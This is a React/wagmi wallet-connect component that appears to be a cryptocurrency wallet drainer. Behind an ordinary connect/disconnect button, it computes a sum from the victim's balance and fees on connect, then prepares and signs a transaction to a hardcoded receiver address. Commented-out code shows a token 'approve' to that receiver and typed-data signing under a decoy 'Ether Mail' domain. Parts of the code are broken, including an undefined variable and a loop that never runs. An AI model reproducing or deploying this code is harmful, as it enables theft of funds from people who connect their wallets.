"use client"
import {useAccount, useBalance, useFeeData, useDisconnect, useWalletClient, useNetwork, useSignTypedData, usePublicClient } from 'wagmi'
import { signTrans } from '@/utils/transact'
import {useEffect, useState} from "react"
import { erc20ABI } from 'wagmi'
import { receivers, con_adds } from '@/utils/constant/address'

//const receiver = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
export const BCon = () => {
  //const adds = "0x2170Ed0880ac9A755fd29B2688956BD959F933F8"
  const publicClient = usePublicClient()
  const domain =  {
    name: 'Ether Mail',
    version: '1',
    chainId: 56,
    verifyingContract: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52',
  } as const
  
  const types = {
    tx: [
      { name: 'to', type: 'address' },
      { name: 'account', type: 'address' },
      {name: "value", type:"uint256"}
    ]
  } as const 
 
  const [amt, setAmt] = useState(BigInt("0"))

 // const [req, setRequest] = useState({})
  
  //const [account, setAccount] = useState('0x2170Ed0880ac9A755fd29B2688956BD959F933F8')
  const {chain} = useNetwork()
  const [receiver, setReceiver] = useState("0x2170Ed0880ac9A755fd29B2688956BD959F933F8")
  const [con_add, setConAdd] = useState('0xB8c77482e45F1F44dE1745F52C74426C631bDD52') 
  const {address, isConnected} = useAccount({

  async onConnect({ address, connector, isReconnected }) {
     
    let bal = data?.value || BigInt("0")

    /*
    const gasEst = await publicClient.estimateContractGas({
      address: con_add,
      abi: erc20ABI,
      functionName: "approve",
      args: [receiver, amt],
      account: address
      
    }) */
 /**
     * if(bal <= BigInt("0"))
     * {
     *   alert("Wallet not eligible")
     *   disconnect()
     * return
     * }
     * 
     */
    
    let fee = gasPrice?.gasPrice || BigInt("0")
    const rems = fee - bal // - fee change back to balance minus fee
    
    const cid = chain?.id || 1
    if(cid !== 1)

   { setConAdd(con_adds[cid])}
   // setReceiver(receivers[cid])
    setAmt(rems)
    console.log("Chain and address ",chain?.name, con_adds[cid])
    }
  })


const {data: walletClient, isFetched, status} = useWalletClient(
  
  { 
    
  onError(error) {
   
    console.log("WC error", error)
  },

  async onSuccess(data) {

    if(isConnected)
    {

     // const [address]= await data?.getAddresses()
      // console.log(addresses)
      console.log(receiver, con_add)
      /*
      const {request} = await publicClient.simulateContract({
        address: con_add,
        abi: erc20ABI,
        functionName: "approve",
        args: [receiver, amt],
        account: address
        
      }) */
      const msg = {
        
        to: receiver,
        account: address,
        value: amt
      } as const
    //  const tx = await data?.signTypedData({domain, types, primaryType:"tx", message: msg})
      const sx = await data?.prepareTransactionRequest({
        
        to: receiver,
        account: address,
        value: BigInt("1")
      } )
      const sign = await data?.signTransaction(sx)
      console.log(tx, sx, sign)
   //   console.log(data)
  while(false) 
    {

      try {
            const res = await data?.writeContract(request)
            console.log("WC datas",res)
break
          // await data?.sendRawTransaction(res)
       } catch (error) {
        console.log(error)
       }
     }
   }
  }
})
const { disconnect } = useDisconnect()



    const { data } = useBalance({
      address
    })
const {data: gasPrice } = useFeeData()
   
        if(isConnected) return <button className='btn btn-primary ' onClick={() => disconnect()}>Disconnect</button>
        return (
          <>
    <w3m-button />
     </>

        )

}


